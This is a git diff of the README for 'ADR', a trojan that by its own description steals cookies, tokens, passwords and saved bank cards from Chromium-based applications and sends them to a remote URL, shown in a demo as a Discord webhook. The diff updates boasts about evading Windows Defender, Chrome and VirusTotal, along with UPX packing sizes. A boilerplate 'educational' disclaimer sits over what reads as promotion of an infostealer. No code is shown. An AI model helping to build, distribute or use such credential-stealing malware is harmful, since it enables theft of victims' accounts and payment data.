@@ -1,8 +1,8 @@
 # ADR 💥
 
-ADR is a trojan that retrieves all information on the computer and all data stored in applications using chormium. It recovers cookies, tokens, passwords and saved bank cards. This malware is undetectable by Windows Defender, Chrome, Virustotal (4/71).
+ADR is a trojan that retrieves all information on the computer and all data stored in applications using chormium. It recovers cookies, tokens, passwords and saved bank cards. This malware is undetectable by Windows Defender, Chrome, Virustotal (~8/72).
 
-> ❗ This project has a strictly educational objective. It aims to provide information, advice and resources in an educational context. I want to emphasize that I do not support or encourage any malicious or damaging use of this information. Any negative or abusive interpretation goes against the educational intent of this project. As the creator of this content, I accept no responsibility for any misuse that may arise from its use.
+> ⚠️ This project has a strictly educational objective. It aims to provide information, advice and resources in an educational context. I want to emphasize that I do not support or encourage any malicious or damaging use of this information. Any negative or abusive interpretation goes against the educational intent of this project. As the creator of this content, I accept no responsibility for any misuse that may arise from its use.
 
 ## bADR (EXE)
 
@@ -62,35 +62,23 @@ build.bat
 **bADR (EXE)**
 
 *   ❔     Virustotal 6/70 
-    * ❌     6
-    * ✅     70
-*   ✅     Windows Defender
-*   ✅     Chrome AntiVirus
-*   ✅     Manalyzer
+*   ✅     Windows Defender, Chrome AntiVirus, Manalyzer
 
 **gADR (EXE)**
 
 *   ❔     Virustotal 4/70 
-    * ❌     4
-    * ✅     70
-*   ✅     Windows Defender
-*   ✅     Chrome AntiVirus
-*   ✅     Manalyzer
+*   ✅     Windows Defender, Chrome AntiVirus, Manalyzer
 
 
 **ADR (XOR)**
-
-*   ✅     Virustotal 72/72
-*   ✅     Windows Defender
-*   ✅     Chrome AntiVirus
-*   ✅     Manalyzer
+*   ✅     Virustotal, Windows Defender,  Chrome AntiVirus, Manalyzer
 
 **ADR (DLL)**
 
 *   ❔     Virustotal 2/70 
-    * ❌     2
-    * ✅     70
-*   ✅     Windows Defender
+*   ❌  Windows Defender,  Chrome AntiVirus
+*   ✅  Manalyzer
+
 
 ### UPX compression
 
@@ -102,7 +90,9 @@ bADR.exe 114  ko => 54   ko  (Runtime Library Multi-threaded /MT)
 ADR.dll  17  ko => 10.5  ko
 ```
 
-### Demo
+### Demo (v1, v2, v3)
+
+> ⚠️ This demo is only valid for release 3 or later, the following versions no longer use discord to store the information
 
 Once the malware is launched, all the information is then sent to a url. In the demo, it's a discord webhook that displays the data we collect.
 This data comes from a Virustotal virtual machine that checks and analyzes the behavior of the malware.
